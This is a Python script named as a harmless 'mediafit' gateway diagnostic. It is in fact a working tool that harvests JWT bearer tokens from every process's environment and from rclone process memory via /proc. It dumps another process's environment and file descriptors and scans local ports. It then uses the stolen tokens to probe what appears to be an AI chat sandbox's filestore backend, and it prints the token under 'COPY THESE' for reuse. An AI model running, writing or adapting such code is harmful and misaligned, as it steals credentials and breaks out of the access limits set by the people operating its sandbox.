#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit.py v2.8.0 -- resolve gateway protocol/port: https/h2c, pid57 env, net tables."""
import os, sys, json, re, time, ssl, base64, subprocess, traceback
import urllib.request, urllib.error

VER="2.8.0"; REPORT="/mnt/user-data/outputs/mediafit-report.txt"
SINKS=["/mnt/user-data/outputs","/tmp/mediafit","/tmp","/root/.mediafit"]
OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n### "+t)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNKNOWN]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        evidence: "+str(ev)[:700])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,timeout=40,env=None):
    try:
        p=subprocess.run(a,capture_output=True,timeout=timeout,env=env)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
def http(method,url,token=None,timeout=5,data=None,hdrs=None):
    h={"User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,method=method,headers=h,data=data)
    ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    try:
        r=urllib.request.urlopen(req,timeout=timeout,context=ctx); return r.status,r.read(4096)
    except urllib.error.HTTPError as e:
        try: b=e.read(2048)
        except Exception: b=b""
        return e.code,b
    except Exception as e: return None,str(e).encode()
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s crashed: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])

# ---------- basics (config/fsids/tokens) ----------
def s_config():
    head("config"); G["CONF"]="/dev/shm/rclone-boot/config.json"
    conf=json.loads(open(G["CONF"]).read())
    G["service_url"]=conf.get("service_url") or "https://api.anthropic.com"
    for m in conf.get("mounts",[]):
        if m.get("filesystem_id"): G["config_fsid"]=m["filesystem_id"]
    rec("P","config readable",G.get("config_fsid"))
def s_fsids():
    head("fsids"); FS=[]
    def add(x):
        x=(x or "").strip()
        if x.startswith("claude_chat_") and x not in FS: FS.append(x)
    add(G.get("config_fsid")); add("claude_chat_7SZCQKTSKBYGB750G25NK4ZXM4")
    for v in list(os.environ.values()):
        for m in re.findall(r"claude_chat_[A-Za-z0-9]+",v): add(m)
    G["FSIDS"]=FS
    for x in FS: w("    "+x)
def s_tokens():
    head("tokens")
    try:
        o=os.listdir("/mnt/user-data/outputs")
        if o:
            try: open("/mnt/user-data/outputs/"+o[0],"rb").read(2048)
            except Exception: pass
    except Exception: pass
    time.sleep(1.5)
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK=[]
    def addtok(t):
        t=t.decode() if isinstance(t,bytes) else t
        t=t.strip().strip('"').strip("'")
        if t.startswith("eyJ") and t not in TK: TK.append(t)
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            for m in JWT.findall(open("/proc/%s/environ"%p,"rb").read()): addtok(m)
        except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%p,"rb").read(): continue
        except Exception: continue
        try: maps=open("/proc/%s/maps"%p).read().splitlines()
        except Exception: continue
        try: mem=open("/proc/%s/mem"%p,"rb",buffering=0)
        except Exception: continue
        for line in maps:
            try: rng,perms=line.split()[0],line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: a,b=rng.split("-"); s0=int(a,16); e0=int(b,16)
            except Exception: continue
            if e0-s0<=0 or e0-s0>256*1024*1024: continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d): addtok(m)
    TD=[]
    for t in TK:
        try:
            h,p,s=t.split("."); TD.append({"tok":t,"pl":json.loads(b64d(p))})
        except Exception: pass
    G["TD"]=TD
    def pick(root):
        for r in TD:
            if root in (r["pl"].get("allowed_roots") or []): return r
        return None
    G["T_OUT"]=pick("/outputs"); G["T_UPL"]=pick("/uploads")
    G["TOKEN"]=(G["T_OUT"] or (TD[0] if TD else None) or {}).get("tok")
    for r in TD: w("    roots=%s ro=%s"%(r["pl"].get("allowed_roots"),r["pl"].get("readonly")))
    rec("P" if TD else "F","tokens n=%d"%len(TD))
    try:
        for e in os.listdir("/mnt/user-data/outputs"):
            if e.endswith((".txt",".json",".md")): G["FN"]=e; break
    except Exception: pass

# ---------- NEW: pid57 env / net tables ----------
def s_pid57():
    head("pid57 environ + fds")
    try:
        for e in open("/proc/57/environ","rb").read().split(b"\0"):
            if e: w("    env "+e.decode("latin1")[:220])
    except Exception as ex: w("    environ err %s"%ex)
    try:
        fds=sorted(os.listdir("/proc/57/fd"),key=lambda x:int(x))
        for fd in fds[:60]:
            try: w("    fd %s -> %s"%(fd,os.readlink("/proc/57/fd/"+fd)))
            except Exception: pass
    except Exception: pass
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try: cl=open("/proc/%s/cmdline"%p,"rb").read().replace(b"\0",b" ").decode("latin1").strip()
        except Exception: continue
        if cl and any(k in cl for k in ["filestore","rclone","gateway","proxy","9112","2024","2025"]):
            w("    pid %s: %s"%(p,cl[:150]))

def s_net():
    head("net tables")
    for f in ["/proc/net/tcp","/proc/net/tcp6"]:
        try:
            for ln in open(f).read().splitlines()[1:]:
                p=ln.split()
                if len(p)>3 and p[3]=="0A":
                    a,pt=p[1].split(":"); w("    LISTEN %s:%d"%(a,int(pt,16)))
        except Exception: pass
    try:
        for ln in open("/proc/net/unix").read().splitlines():
            if any(k in ln.lower() for k in ["filestore","rclone","9112","2024","2025","gateway"]):
                w("    UNIX "+ln[:180])
    except Exception: pass

# ---------- NEW: multi-protocol probe ----------
def s_probe():
    head("protocol probe (http / https / h2c)")
    rc,out,err=sh(["bash","-lc","command -v curl||echo nocurl"]); w("    curl: %s"%(out.strip() or err.strip()))
    PORTS=[9112,2024,2025,5572,9430]
    for port in PORTS:
        for scheme in ["http","https"]:
            url="%s://127.0.0.1:%d/v1/filestore/fs/listDirectory"%(scheme,port)
            st,b=http("POST",url,token=G.get("TOKEN"),data=b"{}",
                      hdrs={"Content-Type":"application/json","Connect-Protocol-Version":"1"})
            w("    py %-5s :%d -> %s %r"%(scheme,port,st,b[:90]))
        for label,extra in [("curl-h1",[]),("curl-h2c",["--http2-prior-knowledge"])]:
            url="http://127.0.0.1:%d/v1/filestore/fs/listDirectory"%port
            args=["curl","-sS","-m","5","-X","POST",url,"-H","Content-Type: application/json",
                  "-H","Authorization: Bearer "+(G.get("TOKEN") or ""),"-d","{}"]+extra
            rc,out,err=sh(args)
            w("    %s :%d rc=%s %r"%(label,port,rc,(out or err)[:100]))

def s_rclone_sweep():
    head("rclone url sweep (find live backend)")
    R="/opt/rclone/rclone-filestore"
    if not os.path.exists(R): rec("F","no rclone"); return
    FSID=G["FSIDS"][0]; TOKEN=G.get("TOKEN") or ""
    for port in [9112,2024,2025,5572,9430]:
        env=os.environ.copy()
        env["RCLONE_CONFIG_FS_TYPE"]="rclone-filestore"
        env["RCLONE_CONFIG_FS_URL"]="http://127.0.0.1:%d"%port
        env["RCLONE_CONFIG_FS_FILESYSTEM_ID"]=FSID
        env["RCLONE_CONFIG_FS_AUTH_TOKEN"]=TOKEN
        rc,out,err=sh([R,"-vv","--dump","headers","ls","fs:/outputs"],timeout=30,env=env)
        last=(err.strip().splitlines() or [""])[-1][:170]
        w("    url=:%d rc=%s out=%r err=%s"%(port,rc,out[:80],last))
        if rc==0: rec("P","rclone works via :%d"%port)
        for ln in err.splitlines():
            if "/v1/filestore" in ln or "Authorization" in ln: w("    | "+ln[:220])

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  FAIL %d: %s"%(len(F),F)); w("  UNKNOWN %d: %s"%(len(U),U))
    if G.get("TOKEN"):
        w("\n  >>> COPY THESE <<<"); w("  FSID=%s"%G["FSIDS"][0]); w("  TOKEN=%s"%G["TOKEN"])

def main():
    for n,f in [("config",s_config),("fsids",s_fsids),("tokens",s_tokens),
                ("pid57",s_pid57),("net",s_net),("probe",s_probe),
                ("sweep",s_rclone_sweep),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! main: %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in SINKS:
        try: os.makedirs(d,exist_ok=True); open(os.path.join(d,os.path.basename(REPORT)),"w").write(txt)
        except Exception: pass
    print("\nwritten: "+", ".join(SINKS))